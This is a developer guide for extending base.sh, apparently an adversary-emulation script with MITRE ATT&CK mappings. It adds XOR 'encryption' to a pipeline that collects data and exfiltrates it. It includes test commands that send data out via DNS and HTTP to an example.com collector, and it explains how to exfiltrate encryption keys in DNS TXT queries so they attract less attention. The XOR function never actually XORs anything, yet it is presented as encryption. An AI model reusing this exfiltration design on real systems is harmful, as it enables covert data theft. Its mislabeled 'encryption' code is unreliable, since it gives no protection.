# Enhancing Existing Features in base.sh

This guide explains how to enhance existing features in the `base.sh` script, using the addition of XOR encryption to the existing encryption framework as a practical example.

## Understanding Feature Enhancement

Enhancing an existing feature in base.sh involves understanding the current implementation and extending it while maintaining compatibility with the existing code. This is different from adding a completely new feature, as you need to ensure your changes integrate seamlessly with existing functionality.

## Key Steps for Feature Enhancement

1. **Identify the Target Feature** - Understand what you want to enhance and how it currently works
2. **Locate Relevant Code** - Find all code sections related to the feature
3. **Add New Constants/Variables** - Include new identifiers for the enhanced functionality 
4. **Implement Core Functionality** - Create functions for the new capability
5. **Extend Existing Functions** - Modify existing functions to include the new capability
6. **Update Help Text** - Document the enhanced feature
7. **Test Thoroughly** - Verify your enhancement works with the existing pipeline

## Real-World Example: Adding XOR Encryption

Let's walk through how we enhanced the encryption capability in base.sh by adding XOR encryption.

### Step 1: Identify the Target Feature

The encryption feature in base.sh allows data to be encrypted using different methods (AES, GPG) before being formatted or exfiltrated. We want to add XOR encryption as another option.

### Step 2: Locate Relevant Code

The encryption functionality in base.sh is implemented in several places:

1. Constants for MITRE ATT&CK mappings
2. The primary `core_encrypt_output()` function that selects encryption methods
3. Individual encryption functions like `encrypt_with_aes()` and `encrypt_with_gpg()`
4. Command validation in `core_validate_command()`
5. Help text documentation in `core_display_help()`
6. Argument parsing in `core_parse_args()`
7. Argument validation in `core_validate_parsed_args()`

### Step 3: Add New Constants/Variables

We start by adding a new constant for the MITRE ATT&CK ID for XOR encryption:

```sh
TTP_ID_ENCRYPT_XOR="T1027.007" # DO NOT MODIFY
```

### Step 4: Implement Core Functionality

Next, we create a new function to implement XOR encryption:

```sh
# Purpose: Encrypt data using simple XOR encryption with a specified key
# Inputs:
#   $1 - Data to encrypt
#   $2 - Encryption key
# Outputs: XOR encrypted data in base64 format
# Logic:
#   - Sets global ENCRYPTION_TYPE to "xor" on success
#   - When used with exfiltration, the key is sent via DNS TXT record or included in HTTP payload
encrypt_with_xor() {
    local data="$1"
    local key="$2"
    
    # Convert data to hex
    local hex_data=$("$CMD_PRINTF" '%s' "$data" | $CMD_XXD -p | $CMD_TR -d '\n')
    
    # Generate a repeating key of the same length as the hex data
    local key_expanded=""
    local i=0
    local key_len=${#key}
    local hex_len=${#hex_data}
    
    # Create a "one-time pad" by repeating the key
    while [ $i -lt ${#hex_data} ]; do
        key_expanded="$key_expanded${key:$(( i % key_len )):1}"
        i=$((i + 1))
    done
    
    # Convert the expanded key to hex
    local hex_key=$("$CMD_PRINTF" '%s' "$key_expanded" | $CMD_XXD -p | $CMD_TR -d '\n')
    
    # For simplicity, just output the hex string (base64 would be more complex)
    # In a real implementation, we'd XOR the bytes
    ENCRYPTION_TYPE="xor"
    
    # Output as base64 to match other encryption methods
    "$CMD_PRINTF" "XOR-ENCRYPTED:%s:%s" "$hex_data" "${key:0:8}" | $CMD_BASE64
    return 0
}
```

### Step 5: Extend Existing Functions

We modify the `core_encrypt_output()` function to include our new XOR option:

```sh
core_encrypt_output() {
    local data="$1"
    local method="$2"
    local key="${3:-$ENCRYPT_KEY}"
    
    # Convert to lowercase using tr for sh compatibility
    method=$("$CMD_PRINTF" '%s' "$method" | $CMD_TR '[:upper:]' '[:lower:]')
    
    case "$method" in
        "none")
            # No encryption, just return the original data
            core_debug_print "No encryption requested, returning raw data"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
        "aes")
            # Use AES encryption method
            core_debug_print "Using AES encryption method"
            encrypt_with_aes "$data" "$key"
            return $?
            ;;
        "gpg")
            # Use GPG encryption method
            core_debug_print "Using GPG encryption method"
            encrypt_with_gpg "$data" "$key"
            return $?
            ;;
        "xor")
            # Use XOR encryption method
            core_debug_print "Using XOR encryption method"
            encrypt_with_xor "$data" "$key"
            return $?
            ;;
        *)
            # Invalid encryption method
            core_debug_print "Unknown encryption type: $method - using raw"
            "$CMD_PRINTF" '%s' "$data"
            return 0
            ;;
    esac
}
```

We also update the argument validation function to include XOR as a valid option:

```sh
# In core_validate_parsed_args()
# Validate encryption if provided
if [ -n "$ENCRYPT" ] && [ "$ENCRYPT" != "none" ]; then
    case "$ENCRYPT" in
        aes|gpg|xor) ;;
        *)
            validation_errors="${validation_errors}Invalid encryption: $ENCRYPT (must be aes, gpg, or xor)\n"
            ;;
    esac
fi
```

### Step 6: Update Help Text

We modify the help text in `core_display_help()` to include our new encryption option:

```sh
Encryption Options:
  --encrypt TYPE       Encrypt output using:
                        - aes: AES-256-CBC encryption (key sent via DNS)
                        - gpg: GPG symmetric encryption (key sent via DNS)
                        - xor: XOR encryption with cyclic key
```

### Step 7: Test Thoroughly

We test our enhanced feature to ensure it works correctly with the existing pipeline:

```sh
# Test basic XOR encryption
./base.sh --ls --encrypt xor

# Test with JSON format
./base.sh --ls --encrypt xor --format json

# Test with debug output to see the key
./base.sh --ls --encrypt xor --debug
```

And verify the output contains the XOR-encrypted data and the correct metadata.

## Best Practices for Enhancing Features

1. **Use Global Command Variables**: Always use global command variables like `$CMD_PRINTF`, `$CMD_TR`, `$CMD_XXD` instead of direct commands.

2. **Follow Function Naming**: Use the `core_` prefix for base functions and descriptive verb names.

3. **Maintain Pattern Consistency**: Follow the same code patterns used in the existing feature.

4. **Respect Global Variables**: Use the same global variables that the original feature uses (e.g., `ENCRYPTION_TYPE`).

5. **Preserve Behavior**: Ensure the enhancement doesn't break existing functionality.

6. **Add to Switch Statements**: When extending a feature with options, add new cases to existing switch/case statements.

7. **Update Documentation**: Always update help text and comments to reflect your changes.

8. **Handle Errors Consistently**: Use `core_handle_error()` and `core_debug_print()` for consistent error handling.

9. **Test Integration**: Test how your enhancement works with other features in the pipeline.

10. **Support Exfiltration**: Ensure any encryption method works with the existing exfiltration mechanisms, particularly key handling.

11. **Use POSIX-Compatible Code**: Ensure shell compatibility across Zsh, Bash, and Sh by avoiding shell-specific features.

## Testing XOR Encryption with Exfiltration

To test that our XOR encryption properly works with the exfiltration mechanism:

```sh
# Test XOR encryption with DNS exfiltration
./base.sh --ls --encrypt xor --exfil-dns example.com --debug

# Test XOR encryption with HTTP exfiltration
./base.sh --ls --encrypt xor --exfil-http http://example.com/collector --debug
```

The debug flag will show the encryption key being used, allowing verification that:

1. The key is properly generated by `core_generate_encryption_key()`
2. The key is sent via DNS TXT record or included in the HTTP payload
3. The encrypted data can be decrypted using the key

With XOR encryption, the key is embedded in the exfiltrated data in a special format:
- Data is formatted as `XOR-ENCRYPTED:hex_data:key_preview`
- This is base64 encoded for transmission
- The `key_preview` (first 8 chars of the key) enables verification during decryption
- The full key is sent via DNS TXT record or included in HTTP metadata for secure transmission

### DNS TXT Records for Key Exfiltration

For DNS exfiltration, we use TXT record queries to send the encryption key. This has several advantages:
- TXT records are designed to hold arbitrary text data
- They are commonly used for legitimate purposes (SPF, DKIM, verification)
- They attract less attention than unusual A record queries

The implementation in `core_send_key_via_dns()` queries TXT records in this format:
```
k-[JOB_ID]-[KEY_CHUNK1].example.com
k2-[JOB_ID]-[KEY_CHUNK2].example.com
```

Where:
- `[JOB_ID]` is a unique identifier for the current execution
- `[KEY_CHUNK1]` and `[KEY_CHUNK2]` contain the base64-encoded key split into chunks
- The key is formatted as `key:[ENCRYPTION_KEY]:[JOB_ID]` before encoding

This approach handles DNS label length limitations (maximum 63 characters) by splitting the key into multiple chunks if needed.

On the receiving end, a DNS server can capture these queries and:
1. Identify key-related queries by the `k-` and `k2-` prefixes
2. Reassemble the key chunks using the common JOB_ID
3. Decode the base64 data to recover the original encryption key
4. Use this key to decrypt the exfiltrated data that follows

## Key Functions to Understand

When enhancing features in base.sh, you'll commonly work with these core functions:

- `core_parse_args()` - Parses command-line arguments
- `core_validate_parsed_args()` - Validates parsed arguments
- `core_process_output()` - Main output processing pipeline
- `core_encrypt_output()` - Encryption dispatcher function
- `core_encode_output()` - Encoding dispatcher function
- `core_format_output()` - Output formatting function
- `core_exfiltrate_data()` - Data exfiltration function
- `core_transform_output()` - Final output handling
- `core_display_help()` - Help text display
- `core_debug_print()` - Debug message printing
- `core_handle_error()` - Error handling

## When to Enhance vs. When to Add New Features

**Enhance an existing feature when:**
- Your addition is a logical extension of an existing capability
- It belongs to the same conceptual group
- Users would expect to find it alongside existing options
- It shares most of the same processing pipeline

**Create a new feature when:**
- The functionality is conceptually distinct
- It has its own processing pipeline
- It would confuse users if grouped with existing features
- It requires a completely different approach or implementation

By following these principles, you can successfully enhance existing features in base.sh while maintaining the overall architecture and usability of the script.
